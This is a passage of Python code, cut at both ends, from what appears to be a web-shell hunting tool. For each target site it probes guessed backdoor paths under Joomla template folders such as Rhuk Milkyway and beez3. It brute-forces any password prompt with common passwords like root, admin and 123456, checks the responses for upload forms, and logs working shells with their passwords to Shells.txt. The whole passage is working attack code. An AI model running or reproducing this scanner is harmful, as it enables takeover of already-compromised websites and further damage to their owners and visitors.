																						print(' # '+site +'/ --> {}[purity]'.format(fg))
																						with open('Shells.txt', mode='a') as d:
																							d.write(SH8_J+'#12345')
																					else :
																						p123456 = requests.post(SH8_J,data=password_123456,timeout=15).content
																						if ' type="file"' in p123456 or ' type=\'file\'' in p123456 or ' type= "file"' in p123456 or ' type= \'file\'' in p123456 or ' type = "file"' in p123456 or ' type = \'file\'' in p123456 or ' type ="file"' in p123456 or ' type =\'file\'' in p123456 or ' type=file' in p123456 or ' type =file' in p123456 or ' type= file' in p123456 or ' type = file' in p123456 :
																							print(' # '+site +'/ --> {}[purity]'.format(fg))
																							with open('Shells.txt', mode='a') as d:
																								d.write(SH8_J+'#123456')
																						else :
																							p123123 = requests.post(SH8_J,data=password_123123,timeout=15).content
																							if ' type="file"' in p123123 or ' type=\'file\'' in p123123 or ' type= "file"' in p123123 or ' type= \'file\'' in p123123 or ' type = "file"' in p123123 or ' type = \'file\'' in p123123 or ' type ="file"' in p123123 or ' type =\'file\'' in p123123 or ' type=file' in p123123 or ' type =file' in p123123 or ' type= file' in p123123 or ' type = file' in p123123 :
																								print(' # '+site +'/ --> {}[purity]'.format(fg))
																								with open('Shells.txt', mode='a') as d:
																									d.write(SH8_J+'#123123')
																							else :
																								p123321 = requests.post(SH8_J,data=password_123321,timeout=15).content
																								if ' type="file"' in p123321 or ' type=\'file\'' in p123321 or ' type= "file"' in p123321 or ' type= \'file\'' in p123321 or ' type = "file"' in p123321 or ' type = \'file\'' in p123321 or ' type ="file"' in p123321 or ' type =\'file\'' in p123321 or ' type=file' in p123321 or ' type =file' in p123321 or ' type= file' in p123321 or ' type = file' in p123321 :
																									print(' # '+site +'/ --> {}[purity]'.format(fg))
																									with open('Shells.txt', mode='a') as d:
																										d.write(SH8_J+'#123321')
																								else :
																									p123456789 = requests.post(SH8_J,data=password_123456789,timeout=15).content
																									if ' type="file"' in p123456789 or ' type=\'file\'' in p123456789 or ' type= "file"' in p123456789 or ' type= \'file\'' in p123456789 or ' type = "file"' in p123456789 or ' type = \'file\'' in p123456789 or ' type ="file"' in p123456789 or ' type =\'file\'' in p123456789 or ' type=file' in p123456789 or ' type =file' in p123456789 or ' type= file' in p123456789 or ' type = file' in p123456789 :
																										print(' # '+site +'/ --> {}[purity]'.format(fg))
																										with open('Shells.txt', mode='a') as d:
																											d.write(SH8_J+'#123456789')
																									else :
																										p1234567890 = requests.post(SH8_J,data=password_1234567890,timeout=15).content
																										if ' type="file"' in p1234567890 or ' type=\'file\'' in p1234567890 or ' type= "file"' in p1234567890 or ' type= \'file\'' in p1234567890 or ' type = "file"' in p1234567890 or ' type = \'file\'' in p1234567890 or ' type ="file"' in p1234567890 or ' type =\'file\'' in p1234567890 or ' type=file' in p1234567890 or ' type =file' in p1234567890 or ' type= file' in p1234567890 or ' type = file' in p1234567890 :
																											print(' # '+site +'/ --> {}[purity]'.format(fg))
																											with open('Shells.txt', mode='a') as d:
																												d.write(SH8_J+'#1234567890')
																										else :
																											phaurgeulis = requests.post(SH8_J,data=password_haurgeulis,timeout=15).content
																											if 'Andela1C3' in phaurgeulis  :
																												print(' # '+site +'/ --> {}[purity]'.format(fg))
																												with open('Shells.txt', mode='a') as d:
																													d.write(SH8_J+'#haurgeulis')
																											else :
																												print(' # '+site +' --> {}[Failed]'.format(fr))
													else :
														SH9_J_content = requests.get(SH9_J,timeout=15).content
														if ' type="file"' in SH9_J_content or ' type=\'file\'' in SH9_J_content or ' type= "file"' in SH9_J_content or ' type= \'file\'' in SH9_J_content or ' type = "file"' in SH9_J_content or ' type = \'file\'' in SH9_J_content or ' type ="file"' in SH9_J_content or ' type =\'file\'' in SH9_J_content or ' type=file' in SH9_J_content or ' type =file' in SH9_J_content or ' type= file' in SH9_J_content or ' type = file' in SH9_J_content or 'Upload</a> ]</li><li>[' in SH9_J_content or 'upload</a><li><a>Sym' in SH9_J_content :
															print(' # '+site +'/ --> {}[Rhuk Milkyway]'.format(fg))
															with open('Shells.txt', mode='a') as d:
																d.write(SH9_J+'')
														elif ' name=pass' in SH9_J_content :
															nhzgrf = requests.post(SH9_J,data=password_nhzgrf,timeout=15).content
															if ' type="file"' in nhzgrf or ' type=\'file\'' in nhzgrf or ' type= "file"' in nhzgrf or ' type= \'file\'' in nhzgrf or ' type = "file"' in nhzgrf or ' type = \'file\'' in nhzgrf or ' type ="file"' in nhzgrf or ' type =\'file\'' in nhzgrf or ' type=file' in nhzgrf or ' type =file' in nhzgrf or ' type= file' in nhzgrf or ' type = file' in nhzgrf :
																print(' # '+site +'/ --> {}[Rhuk Milkyway]'.format(fg))
																with open('Shells.txt', mode='a') as d:
																	d.write(SH9_J+'#nhzgrf')
															else :
																proot = requests.post(SH9_J,data=password_root,timeout=15).content
																if ' type="file"' in proot or ' type=\'file\'' in proot or ' type= "file"' in proot or ' type= \'file\'' in proot or ' type = "file"' in proot or ' type = \'file\'' in proot or ' type ="file"' in proot or ' type =\'file\'' in proot or ' type=file' in proot or ' type =file' in proot or ' type= file' in proot or ' type = file' in proot :
																	print(' # '+site +'/ --> {}[Rhuk Milkyway]'.format(fg))
																	with open('Shells.txt', mode='a') as d:
																		d.write(SH9_J+'#root')
																else :
																	pr00t = requests.post(SH9_J,data=password_r00t,timeout=15).content
																	if ' type="file"' in pr00t or ' type=\'file\'' in pr00t or ' type= "file"' in pr00t or ' type= \'file\'' in pr00t or ' type = "file"' in pr00t or ' type = \'file\'' in pr00t or ' type ="file"' in pr00t or ' type =\'file\'' in pr00t or ' type=file' in pr00t or ' type =file' in pr00t or ' type= file' in pr00t or ' type = file' in pr00t :
																		print(' # '+site +'/ --> {}[Rhuk Milkyway]'.format(fg))
																		with open('Shells.txt', mode='a') as d:
																			d.write(SH9_J+'#r00t')
																	else :
																		padmin = requests.post(SH9_J,data=password_admin,timeout=15).content
																		if ' type="file"' in padmin or ' type=\'file\'' in padmin or ' type= "file"' in padmin or ' type= \'file\'' in padmin or ' type = "file"' in padmin or ' type = \'file\'' in padmin or ' type ="file"' in padmin or ' type =\'file\'' in padmin or ' type=file' in padmin or ' type =file' in padmin or ' type= file' in padmin or ' type = file' in padmin :
																			print(' # '+site +'/ --> {}[Rhuk Milkyway]'.format(fg))
																			with open('Shells.txt', mode='a') as d:
																				d.write(SH9_J+'#admin')
																		else :
																			pt00r = requests.post(SH9_J,data=password_t00r,timeout=15).content
																			if ' type="file"' in pt00r or ' type=\'file\'' in pt00r or ' type= "file"' in pt00r or ' type= \'file\'' in pt00r or ' type = "file"' in pt00r or ' type = \'file\'' in pt00r or ' type ="file"' in pt00r or ' type =\'file\'' in pt00r or ' type=file' in pt00r or ' type =file' in pt00r or ' type= file' in pt00r or ' type = file' in pt00r :
																				print(' # '+site +'/ --> {}[Rhuk Milkyway]'.format(fg))
																				with open('Shells.txt', mode='a') as d:
																					d.write(SH9_J+'#t00r')
																			else :
																				p123 = requests.post(SH9_J,data=password_123,timeout=15).content
																				if ' type="file"' in p123 or ' type=\'file\'' in p123 or ' type= "file"' in p123 or ' type= \'file\'' in p123 or ' type = "file"' in p123 or ' type = \'file\'' in p123 or ' type ="file"' in p123 or ' type =\'file\'' in p123 or ' type=file' in p123 or ' type =file' in p123 or ' type= file' in p123 or ' type = file' in p123 :
																					print(' # '+site +'/ --> {}[Rhuk Milkyway]'.format(fg))
																					with open('Shells.txt', mode='a') as d:
																						d.write(SH9_J+'#123')
																				else :
																					p1234 = requests.post(SH9_J,data=password_1234,timeout=15).content
																					if ' type="file"' in p1234 or ' type=\'file\'' in p1234 or ' type= "file"' in p1234 or ' type= \'file\'' in p1234 or ' type = "file"' in p1234 or ' type = \'file\'' in p1234 or ' type ="file"' in p1234 or ' type =\'file\'' in p1234 or ' type=file' in p1234 or ' type =file' in p1234 or ' type= file' in p1234 or ' type = file' in p1234 :
																						print(' # '+site +'/ --> {}[Rhuk Milkyway]'.format(fg))
																						with open('Shells.txt', mode='a') as d:
																							d.write(SH9_J+'#1234')
																					else :
																						p12345 = requests.post(SH9_J,data=password_12345,timeout=15).content
																						if ' type="file"' in p12345 or ' type=\'file\'' in p12345 or ' type= "file"' in p12345 or ' type= \'file\'' in p12345 or ' type = "file"' in p12345 or ' type = \'file\'' in p12345 or ' type ="file"' in p12345 or ' type =\'file\'' in p12345 or ' type=file' in p12345 or ' type =file' in p12345 or ' type= file' in p12345 or ' type = file' in p12345 :
																							print(' # '+site +'/ --> {}[Rhuk Milkyway]'.format(fg))
																							with open('Shells.txt', mode='a') as d:
																								d.write(SH9_J+'#12345')
																						else :
																							p123456 = requests.post(SH9_J,data=password_123456,timeout=15).content
																							if ' type="file"' in p123456 or ' type=\'file\'' in p123456 or ' type= "file"' in p123456 or ' type= \'file\'' in p123456 or ' type = "file"' in p123456 or ' type = \'file\'' in p123456 or ' type ="file"' in p123456 or ' type =\'file\'' in p123456 or ' type=file' in p123456 or ' type =file' in p123456 or ' type= file' in p123456 or ' type = file' in p123456 :
																								print(' # '+site +'/ --> {}[Rhuk Milkyway]'.format(fg))
																								with open('Shells.txt', mode='a') as d:
																									d.write(SH9_J+'#123456')
																							else :
																								p123123 = requests.post(SH9_J,data=password_123123,timeout=15).content
																								if ' type="file"' in p123123 or ' type=\'file\'' in p123123 or ' type= "file"' in p123123 or ' type= \'file\'' in p123123 or ' type = "file"' in p123123 or ' type = \'file\'' in p123123 or ' type ="file"' in p123123 or ' type =\'file\'' in p123123 or ' type=file' in p123123 or ' type =file' in p123123 or ' type= file' in p123123 or ' type = file' in p123123 :
																									print(' # '+site +'/ --> {}[Rhuk Milkyway]'.format(fg))
																									with open('Shells.txt', mode='a') as d:
																										d.write(SH9_J+'#123123')
																								else :
																									p123321 = requests.post(SH9_J,data=password_123321,timeout=15).content
																									if ' type="file"' in p123321 or ' type=\'file\'' in p123321 or ' type= "file"' in p123321 or ' type= \'file\'' in p123321 or ' type = "file"' in p123321 or ' type = \'file\'' in p123321 or ' type ="file"' in p123321 or ' type =\'file\'' in p123321 or ' type=file' in p123321 or ' type =file' in p123321 or ' type= file' in p123321 or ' type = file' in p123321 :
																										print(' # '+site +'/ --> {}[Rhuk Milkyway]'.format(fg))
																										with open('Shells.txt', mode='a') as d:
																											d.write(SH9_J+'#123321')
																									else :
																										p123456789 = requests.post(SH9_J,data=password_123456789,timeout=15).content
																										if ' type="file"' in p123456789 or ' type=\'file\'' in p123456789 or ' type= "file"' in p123456789 or ' type= \'file\'' in p123456789 or ' type = "file"' in p123456789 or ' type = \'file\'' in p123456789 or ' type ="file"' in p123456789 or ' type =\'file\'' in p123456789 or ' type=file' in p123456789 or ' type =file' in p123456789 or ' type= file' in p123456789 or ' type = file' in p123456789 :
																											print(' # '+site +'/ --> {}[Rhuk Milkyway]'.format(fg))
																											with open('Shells.txt', mode='a') as d:
																												d.write(SH9_J+'#123456789')
																										else :
																											p1234567890 = requests.post(SH9_J,data=password_1234567890,timeout=15).content
																											if ' type="file"' in p1234567890 or ' type=\'file\'' in p1234567890 or ' type= "file"' in p1234567890 or ' type= \'file\'' in p1234567890 or ' type = "file"' in p1234567890 or ' type = \'file\'' in p1234567890 or ' type ="file"' in p1234567890 or ' type =\'file\'' in p1234567890 or ' type=file' in p1234567890 or ' type =file' in p1234567890 or ' type= file' in p1234567890 or ' type = file' in p1234567890 :
																												print(' # '+site +'/ --> {}[Rhuk Milkyway]'.format(fg))
																												with open('Shells.txt', mode='a') as d:
																													d.write(SH9_J+'#1234567890')
																											else :
																												phaurgeulis = requests.post(SH9_J,data=password_haurgeulis,timeout=15).content
																												if 'Andela1C3' in phaurgeulis  :
																													print(' # '+site +'/ --> {}[Rhuk Milkyway]'.format(fg))
																													with open('Shells.txt', mode='a') as d:
																														d.write(SH9_J+'#haurgeulis')
																												else :
																													print(' # '+site +' --> {}[Failed]'.format(fr))
														else :
															SH10_J_content = requests.get(SH10_J,timeout=15).content
															if ' type="file"' in SH10_J_content or ' type=\'file\'' in SH10_J_content or ' type= "file"' in SH10_J_content or ' type= \'file\'' in SH10_J_content or ' type = "file"' in SH10_J_content or ' type = \'file\'' in SH10_J_content or ' type ="file"' in SH10_J_content or ' type =\'file\'' in SH10_J_content or ' type=file' in SH10_J_content or ' type =file' in SH10_J_content or ' type= file' in SH10_J_content or ' type = file' in SH10_J_content or 'Upload</a> ]</li><li>[' in SH10_J_content or 'upload</a><li><a>Sym' in SH10_J_content :
																print(' # '+site +'/ --> {}[{}]'.format(fg,theme))
																with open('Shells.txt', mode='a') as d:
																	d.write(SH10_J+'')
															elif ' name=pass' in SH10_J_content :
																nhzgrf = requests.post(SH10_J,data=password_nhzgrf,timeout=15).content
																if ' type="file"' in nhzgrf or ' type=\'file\'' in nhzgrf or ' type= "file"' in nhzgrf or ' type= \'file\'' in nhzgrf or ' type = "file"' in nhzgrf or ' type = \'file\'' in nhzgrf or ' type ="file"' in nhzgrf or ' type =\'file\'' in nhzgrf or ' type=file' in nhzgrf or ' type =file' in nhzgrf or ' type= file' in nhzgrf or ' type = file' in nhzgrf :
																	print(' # '+site +'/ --> {}[{}]'.format(fg,theme))
																	with open('Shells.txt', mode='a') as d:
																		d.write(SH10_J+'#nhzgrf')
																else :
																	proot = requests.post(SH10_J,data=password_root,timeout=15).content
																	if ' type="file"' in proot or ' type=\'file\'' in proot or ' type= "file"' in proot or ' type= \'file\'' in proot or ' type = "file"' in proot or ' type = \'file\'' in proot or ' type ="file"' in proot or ' type =\'file\'' in proot or ' type=file' in proot or ' type =file' in proot or ' type= file' in proot or ' type = file' in proot :
																		print(' # '+site +'/ --> {}[{}]'.format(fg,theme))
																		with open('Shells.txt', mode='a') as d:
																			d.write(SH10_J+'#root')
																	else :
																		pr00t = requests.post(SH10_J,data=password_r00t,timeout=15).content
																		if ' type="file"' in pr00t or ' type=\'file\'' in pr00t or ' type= "file"' in pr00t or ' type= \'file\'' in pr00t or ' type = "file"' in pr00t or ' type = \'file\'' in pr00t or ' type ="file"' in pr00t or ' type =\'file\'' in pr00t or ' type=file' in pr00t or ' type =file' in pr00t or ' type= file' in pr00t or ' type = file' in pr00t :
																			print(' # '+site +'/ --> {}[{}]'.format(fg,theme))
																			with open('Shells.txt', mode='a') as d:
																				d.write(SH10_J+'#r00t')
																		else :
																			padmin = requests.post(SH10_J,data=password_admin,timeout=15).content
																			if ' type="file"' in padmin or ' type=\'file\'' in padmin or ' type= "file"' in padmin or ' type= \'file\'' in padmin or ' type = "file"' in padmin or ' type = \'file\'' in padmin or ' type ="file"' in padmin or ' type =\'file\'' in padmin or ' type=file' in padmin or ' type =file' in padmin or ' type= file' in padmin or ' type = file' in padmin :
																				print(' # '+site +'/ --> {}[{}]'.format(fg,theme))
																				with open('Shells.txt', mode='a') as d:
																					d.write(SH10_J+'#admin')
																			else :
																				pt00r = requests.post(SH10_J,data=password_t00r,timeout=15).content
																				if ' type="file"' in pt00r or ' type=\'file\'' in pt00r or ' type= "file"' in pt00r or ' type= \'file\'' in pt00r or ' type = "file"' in pt00r or ' type = \'file\'' in pt00r or ' type ="file"' in pt00r or ' type =\'file\'' in pt00r or ' type=file' in pt00r or ' type =file' in pt00r or ' type= file' in pt00r or ' type = file' in pt00r :
																					print(' # '+site +'/ --> {}[{}]'.format(fg,theme))
																					with open('Shells.txt', mode='a') as d:
																						d.write(SH10_J+'#t00r')
																				else :
																					p123 = requests.post(SH10_J,data=password_123,timeout=15).content
																					if ' type="file"' in p123 or ' type=\'file\'' in p123 or ' type= "file"' in p123 or ' type= \'file\'' in p123 or ' type = "file"' in p123 or ' type = \'file\'' in p123 or ' type ="file"' in p123 or ' type =\'file\'' in p123 or ' type=file' in p123 or ' type =file' in p123 or ' type= file' in p123 or ' type = file' in p123 :
																						print(' # '+site +'/ --> {}[{}]'.format(fg,theme))
																						with open('Shells.txt', mode='a') as d:
																							d.write(SH10_J+'#123')
																					else :
																						p1234 = requests.post(SH10_J,data=password_1234,timeout=15).content
																						if ' type="file"' in p1234 or ' type=\'file\'' in p1234 or ' type= "file"' in p1234 or ' type= \'file\'' in p1234 or ' type = "file"' in p1234 or ' type = \'file\'' in p1234 or ' type ="file"' in p1234 or ' type =\'file\'' in p1234 or ' type=file' in p1234 or ' type =file' in p1234 or ' type= file' in p1234 or ' type = file' in p1234 :
																							print(' # '+site +'/ --> {}[{}]'.format(fg,theme))
																							with open('Shells.txt', mode='a') as d:
																								d.write(SH10_J+'#1234')
																						else :
																							p12345 = requests.post(SH10_J,data=password_12345,timeout=15).content
																							if ' type="file"' in p12345 or ' type=\'file\'' in p12345 or ' type= "file"' in p12345 or ' type= \'file\'' in p12345 or ' type = "file"' in p12345 or ' type = \'file\'' in p12345 or ' type ="file"' in p12345 or ' type =\'file\'' in p12345 or ' type=file' in p12345 or ' type =file' in p12345 or ' type= file' in p12345 or ' type = file' in p12345 :
																								print(' # '+site +'/ --> {}[{}]'.format(fg,theme))
																								with open('Shells.txt', mode='a') as d:
																									d.write(SH10_J+'#12345')
																							else :
																								p123456 = requests.post(SH10_J,data=password_123456,timeout=15).content
																								if ' type="file"' in p123456 or ' type=\'file\'' in p123456 or ' type= "file"' in p123456 or ' type= \'file\'' in p123456 or ' type = "file"' in p123456 or ' type = \'file\'' in p123456 or ' type ="file"' in p123456 or ' type =\'file\'' in p123456 or ' type=file' in p123456 or ' type =file' in p123456 or ' type= file' in p123456 or ' type = file' in p123456 :
																									print(' # '+site +'/ --> {}[{}]'.format(fg,theme))
																									with open('Shells.txt', mode='a') as d:
																										d.write(SH10_J+'#123456')
																								else :
																									p123123 = requests.post(SH10_J,data=password_123123,timeout=15).content
																									if ' type="file"' in p123123 or ' type=\'file\'' in p123123 or ' type= "file"' in p123123 or ' type= \'file\'' in p123123 or ' type = "file"' in p123123 or ' type = \'file\'' in p123123 or ' type ="file"' in p123123 or ' type =\'file\'' in p123123 or ' type=file' in p123123 or ' type =file' in p123123 or ' type= file' in p123123 or ' type = file' in p123123 :
																										print(' # '+site +'/ --> {}[{}]'.format(fg,theme))
																										with open('Shells.txt', mode='a') as d:
																											d.write(SH10_J+'#123123')
																									else :
																										p123321 = requests.post(SH10_J,data=password_123321,timeout=15).content
																										if ' type="file"' in p123321 or ' type=\'file\'' in p123321 or ' type= "file"' in p123321 or ' type= \'file\'' in p123321 or ' type = "file"' in p123321 or ' type = \'file\'' in p123321 or ' type ="file"' in p123321 or ' type =\'file\'' in p123321 or ' type=file' in p123321 or ' type =file' in p123321 or ' type= file' in p123321 or ' type = file' in p123321 :
																											print(' # '+site +'/ --> {}[{}]'.format(fg,theme))
																											with open('Shells.txt', mode='a') as d:
																												d.write(SH10_J+'#123321')
																										else :
																											p123456789 = requests.post(SH10_J,data=password_123456789,timeout=15).content
																											if ' type="file"' in p123456789 or ' type=\'file\'' in p123456789 or ' type= "file"' in p123456789 or ' type= \'file\'' in p123456789 or ' type = "file"' in p123456789 or ' type = \'file\'' in p123456789 or ' type ="file"' in p123456789 or ' type =\'file\'' in p123456789 or ' type=file' in p123456789 or ' type =file' in p123456789 or ' type= file' in p123456789 or ' type = file' in p123456789 :
																												print(' # '+site +'/ --> {}[{}]'.format(fg,theme))
																												with open('Shells.txt', mode='a') as d:
																													d.write(SH10_J+'#123456789')
																											else :
																												p1234567890 = requests.post(SH10_J,data=password_1234567890,timeout=15).content
																												if ' type="file"' in p1234567890 or ' type=\'file\'' in p1234567890 or ' type= "file"' in p1234567890 or ' type= \'file\'' in p1234567890 or ' type = "file"' in p1234567890 or ' type = \'file\'' in p1234567890 or ' type ="file"' in p1234567890 or ' type =\'file\'' in p1234567890 or ' type=file' in p1234567890 or ' type =file' in p1234567890 or ' type= file' in p1234567890 or ' type = file' in p1234567890 :
																													print(' # '+site +'/ --> {}[{}]'.format(fg,theme))
																													with open('Shells.txt', mode='a') as d:
																														d.write(SH10_J+'#1234567890')
																												else :
																													phaurgeulis = requests.post(SH10_J,data=password_haurgeulis,timeout=15).content
																													if 'Andela1C3' in phaurgeulis  :
																														print(' # '+site +'/ --> {}[{}]'.format(fg,theme))
																														with open('Shells.txt', mode='a') as d:
																															d.write(SH10_J+'#haurgeulis')
																													else :
																														print(' # '+site +' --> {}[Failed]'.format(fr))
															else :
																SH11_J_content = requests.get(SH11_J,timeout=15).content
																if ' type="file"' in SH11_J_content or ' type=\'file\'' in SH11_J_content or ' type= "file"' in SH11_J_content or ' type= \'file\'' in SH11_J_content or ' type = "file"' in SH11_J_content or ' type = \'file\'' in SH11_J_content or ' type ="file"' in SH11_J_content or ' type =\'file\'' in SH11_J_content or ' type=file' in SH11_J_content or ' type =file' in SH11_J_content or ' type= file' in SH11_J_content or ' type = file' in SH11_J_content or 'Upload</a> ]</li><li>[' in SH11_J_content or 'upload</a><li><a>Sym' in SH11_J_content :
																	print(' # '+site +'/ --> {}[{}]'.format(fg,theme))
																	with open('Shells.txt', mode='a') as d:
																		d.write(SH11_J+'')
																elif ' name=pass' in SH11_J_content :
																	nhzgrf = requests.post(SH11_J,data=password_nhzgrf,timeout=15).content
																	if ' type="file"' in nhzgrf or ' type=\'file\'' in nhzgrf or ' type= "file"' in nhzgrf or ' type= \'file\'' in nhzgrf or ' type = "file"' in nhzgrf or ' type = \'file\'' in nhzgrf or ' type ="file"' in nhzgrf or ' type =\'file\'' in nhzgrf or ' type=file' in nhzgrf or ' type =file' in nhzgrf or ' type= file' in nhzgrf or ' type = file' in nhzgrf :
																		print(' # '+site +'/ --> {}[{}]'.format(fg,theme))
																		with open('Shells.txt', mode='a') as d:
																			d.write(SH11_J+'#nhzgrf')
																	else :
																		proot = requests.post(SH11_J,data=password_root,timeout=15).content
																		if ' type="file"' in proot or ' type=\'file\'' in proot or ' type= "file"' in proot or ' type= \'file\'' in proot or ' type = "file"' in proot or ' type = \'file\'' in proot or ' type ="file"' in proot or ' type =\'file\'' in proot or ' type=file' in proot or ' type =file' in proot or ' type= file' in proot or ' type = file' in proot :
																			print(' # '+site +'/ --> {}[{}]'.format(fg,theme))
																			with open('Shells.txt', mode='a') as d:
																				d.write(SH11_J+'#root')
																		else :
																			pr00t = requests.post(SH11_J,data=password_r00t,timeout=15).content
																			if ' type="file"' in pr00t or ' type=\'file\'' in pr00t or ' type= "file"' in pr00t or ' type= \'file\'' in pr00t or ' type = "file"' in pr00t or ' type = \'file\'' in pr00t or ' type ="file"' in pr00t or ' type =\'file\'' in pr00t or ' type=file' in pr00t or ' type =file' in pr00t or ' type= file' in pr00t or ' type = file' in pr00t :
																				print(' # '+site +'/ --> {}[{}]'.format(fg,theme))
																				with open('Shells.txt', mode='a') as d:
																					d.write(SH11_J+'#r00t')
																			else :
																				padmin = requests.post(SH11_J,data=password_admin,timeout=15).content
																				if ' type="file"' in padmin or ' type=\'file\'' in padmin or ' type= "file"' in padmin or ' type= \'file\'' in padmin or ' type = "file"' in padmin or ' type = \'file\'' in padmin or ' type ="file"' in padmin or ' type =\'file\'' in padmin or ' type=file' in padmin or ' type =file' in padmin or ' type= file' in padmin or ' type = file' in padmin :
																					print(' # '+site +'/ --> {}[{}]'.format(fg,theme))
																					with open('Shells.txt', mode='a') as d:
																						d.write(SH11_J+'#admin')
																				else :
																					pt00r = requests.post(SH11_J,data=password_t00r,timeout=15).content
																					if ' type="file"' in pt00r or ' type=\'file\'' in pt00r or ' type= "file"' in pt00r or ' type= \'file\'' in pt00r or ' type = "file"' in pt00r or ' type = \'file\'' in pt00r or ' type ="file"' in pt00r or ' type =\'file\'' in pt00r or ' type=file' in pt00r or ' type =file' in pt00r or ' type= file' in pt00r or ' type = file' in pt00r :
																						print(' # '+site +'/ --> {}[{}]'.format(fg,theme))
																						with open('Shells.txt', mode='a') as d:
																							d.write(SH11_J+'#t00r')
																					else :
																						p123 = requests.post(SH11_J,data=password_123,timeout=15).content
																						if ' type="file"' in p123 or ' type=\'file\'' in p123 or ' type= "file"' in p123 or ' type= \'file\'' in p123 or ' type = "file"' in p123 or ' type = \'file\'' in p123 or ' type ="file"' in p123 or ' type =\'file\'' in p123 or ' type=file' in p123 or ' type =file' in p123 or ' type= file' in p123 or ' type = file' in p123 :
																							print(' # '+site +'/ --> {}[{}]'.format(fg,theme))
																							with open('Shells.txt', mode='a') as d:
																								d.write(SH11_J+'#123')
																						else :
																							p1234 = requests.post(SH11_J,data=password_1234,timeout=15).content
																							if ' type="file"' in p1234 or ' type=\'file\'' in p1234 or ' type= "file"' in p1234 or ' type= \'file\'' in p1234 or ' type = "file"' in p1234 or ' type = \'file\'' in p1234 or ' type ="file"' in p1234 or ' type =\'file\'' in p1234 or ' type=file' in p1234 or ' type =file' in p1234 or ' type= file' in p1234 or ' type = file' in p1234 :
																								print(' # '+site +'/ --> {}[{}]'.format(fg,theme))
																								with open('Shells.txt', mode='a') as d:
																									d.write(SH11_J+'#1234')
																							else :
																								p12345 = requests.post(SH11_J,data=password_12345,timeout=15).content
																								if ' type="file"' in p12345 or ' type=\'file\'' in p12345 or ' type= "file"' in p12345 or ' type= \'file\'' in p12345 or ' type = "file"' in p12345 or ' type = \'file\'' in p12345 or ' type ="file"' in p12345 or ' type =\'file\'' in p12345 or ' type=file' in p12345 or ' type =file' in p12345 or ' type= file' in p12345 or ' type = file' in p12345 :
																									print(' # '+site +'/ --> {}[{}]'.format(fg,theme))
																									with open('Shells.txt', mode='a') as d:
																										d.write(SH11_J+'#12345')
																								else :
																									p123456 = requests.post(SH11_J,data=password_123456,timeout=15).content
																									if ' type="file"' in p123456 or ' type=\'file\'' in p123456 or ' type= "file"' in p123456 or ' type= \'file\'' in p123456 or ' type = "file"' in p123456 or ' type = \'file\'' in p123456 or ' type ="file"' in p123456 or ' type =\'file\'' in p123456 or ' type=file' in p123456 or ' type =file' in p123456 or ' type= file' in p123456 or ' type = file' in p123456 :
																										print(' # '+site +'/ --> {}[{}]'.format(fg,theme))
																										with open('Shells.txt', mode='a') as d:
																											d.write(SH11_J+'#123456')
																									else :
																										p123123 = requests.post(SH11_J,data=password_123123,timeout=15).content
																										if ' type="file"' in p123123 or ' type=\'file\'' in p123123 or ' type= "file"' in p123123 or ' type= \'file\'' in p123123 or ' type = "file"' in p123123 or ' type = \'file\'' in p123123 or ' type ="file"' in p123123 or ' type =\'file\'' in p123123 or ' type=file' in p123123 or ' type =file' in p123123 or ' type= file' in p123123 or ' type = file' in p123123 :
																											print(' # '+site +'/ --> {}[{}]'.format(fg,theme))
																											with open('Shells.txt', mode='a') as d:
																												d.write(SH11_J+'#123123')
																										else :
																											p123321 = requests.post(SH11_J,data=password_123321,timeout=15).content
																											if ' type="file"' in p123321 or ' type=\'file\'' in p123321 or ' type= "file"' in p123321 or ' type= \'file\'' in p123321 or ' type = "file"' in p123321 or ' type = \'file\'' in p123321 or ' type ="file"' in p123321 or ' type =\'file\'' in p123321 or ' type=file' in p123321 or ' type =file' in p123321 or ' type= file' in p123321 or ' type = file' in p123321 :
																												print(' # '+site +'/ --> {}[{}]'.format(fg,theme))
																												with open('Shells.txt', mode='a') as d:
																													d.write(SH11_J+'#123321')
																											else :
																												p123456789 = requests.post(SH11_J,data=password_123456789,timeout=15).content
																												if ' type="file"' in p123456789 or ' type=\'file\'' in p123456789 or ' type= "file"' in p123456789 or ' type= \'file\'' in p123456789 or ' type = "file"' in p123456789 or ' type = \'file\'' in p123456789 or ' type ="file"' in p123456789 or ' type =\'file\'' in p123456789 or ' type=file' in p123456789 or ' type =file' in p123456789 or ' type= file' in p123456789 or ' type = file' in p123456789 :
																													print(' # '+site +'/ --> {}[{}]'.format(fg,theme))
																													with open('Shells.txt', mode='a') as d:
																														d.write(SH11_J+'#123456789')
																												else :
																													p1234567890 = requests.post(SH11_J,data=password_1234567890,timeout=15).content
																													if ' type="file"' in p1234567890 or ' type=\'file\'' in p1234567890 or ' type= "file"' in p1234567890 or ' type= \'file\'' in p1234567890 or ' type = "file"' in p1234567890 or ' type = \'file\'' in p1234567890 or ' type ="file"' in p1234567890 or ' type =\'file\'' in p1234567890 or ' type=file' in p1234567890 or ' type =file' in p1234567890 or ' type= file' in p1234567890 or ' type = file' in p1234567890 :
																														print(' # '+site +'/ --> {}[{}]'.format(fg,theme))
																														with open('Shells.txt', mode='a') as d:
																															d.write(SH11_J+'#1234567890')
																													else :
																														phaurgeulis = requests.post(SH11_J,data=password_haurgeulis,timeout=15).content
																														if 'Andela1C3' in phaurgeulis  :
																															print(' # '+site +'/ --> {}[{}]'.format(fg,theme))
																															with open('Shells.txt', mode='a') as d:
																																d.write(SH11_J+'#haurgeulis')
																														else :
																															print(' # '+site +' --> {}[Failed]'.format(fr))
																else :
																	SH12_J_content = requests.get(SH12_J,timeout=15).content
																	if ' type="file"' in SH12_J_content or ' type=\'file\'' in SH12_J_content or ' type= "file"' in SH12_J_content or ' type= \'file\'' in SH12_J_content or ' type = "file"' in SH12_J_content or ' type = \'file\'' in SH12_J_content or ' type ="file"' in SH12_J_content or ' type =\'file\'' in SH12_J_content or ' type=file' in SH12_J_content or ' type =file' in SH12_J_content or ' type= file' in SH12_J_content or ' type = file' in SH12_J_content or 'Upload</a> ]</li><li>[' in SH12_J_content or 'upload</a><li><a>Sym' in SH12_J_content :
																		print(' # '+site +'/ --> {}[beez3]'.format(fg))
																		with open('Shells.txt', mode='a') as d:
																			d.write(SH12_J+'')
																	elif ' name=pass' in SH12_J_content :
																		nhzgrf = requests.post(SH12_J,data=password_nhzgrf,timeout=15).content
																		if ' type="file"' in nhzgrf or ' type=\'file\'' in nhzgrf or ' type= "file"' in nhzgrf or ' type= \'file\'' in nhzgrf or ' type = "file"' in nhzgrf or ' type = \'file\'' in nhzgrf or ' type ="file"' in nhzgrf or ' type =\'file\'' in nhzgrf or ' type=file' in nhzgrf or ' type =file' in nhzgrf or ' type= file' in nhzgrf or ' type = file' in nhzgrf :
